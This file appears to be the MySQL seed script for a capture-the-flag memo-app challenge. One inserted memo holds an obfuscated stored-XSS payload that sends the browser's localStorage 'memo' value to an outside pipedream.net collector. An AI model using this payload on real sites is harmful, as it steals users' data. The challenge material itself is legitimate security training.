use `db`;

DROP TABLE IF EXISTS `user`;
CREATE TABLE user (
  `id` bigint NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `name` VARCHAR(255) NOT NULL UNIQUE,
  `pass` VARCHAR(255) NOT NULL,
  `magic_token` VARCHAR(255) NOT NULL UNIQUE,
  INDEX idx_name (`name`),
  INDEX idx_magic_token (`magic_token`)
) ENGINE=InnoDB DEFAULT CHARACTER SET utf8mb4;

DROP TABLE IF EXISTS `memo`;
CREATE TABLE memo (
  `id` bigint NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `user_id` int NOT NULL,
  `text` TEXT NOT NULL,
  INDEX idx_user_id (`user_id`)
) ENGINE=InnoDB DEFAULT CHARACTER SET utf8mb4;

/* admin */
INSERT INTO user (name, pass, magic_token) VALUES ("admin", "$2b$10$rBtjqhQFdQ4SOiEXqKQVOux6UWhtyvuFRPqB6lPMsY8Ew1VErMKDu", "3210c2b6-b532-4925-997f-e26c2c447e08");

/* solver 攻撃ユーザー */
INSERT INTO user (name, pass, magic_token) VALUES ("Pdg7pcv3kCKMPFGk8YmtcQ56unxBpFVP", "$2b$10$9MpcjdmmUMNcKiaKJ0OzV.ghGH3zqwY7.ATNg.2kfotFb3b/LTvM2", "643984ee-3cfd-416f-ad00-3067143357e9");
/* solver 攻撃コード */
INSERT INTO memo (user_id, text) VALUES (2, '<script src="/magic?token=fetch(String.fromCharCode(104,116,116,112,115,58,47,47,101,110,55,119,106,52,98,112,107,99,103,116,50,119,116,46,109,46,112,105,112,101,100,114,101,97,109,46,110,101,116,47,63,99,116,102,52,98,102,108,97,103,61)%2BencodeURI(localStorage.getItem(String.fromCharCode(109,101,109,111))));//"></script>');

/* solver クロール依頼ユーザー */
INSERT INTO user (name, pass, magic_token) VALUES ("96qmzCV67UFnqdfD", "$2b$10$U4YaGm1K1Y7slK8dRnzxfOOqX4c7.DM5.Fhp9ll753PQ0lXXarKDC", "e7afd5d3-88df-431b-8294-024c656897bf");

REVOKE all privileges ON db.* FROM user;
GRANT SELECT ON db.* TO user;
GRANT INSERT ON db.* TO user;
GRANT DELETE ON db.* TO user;
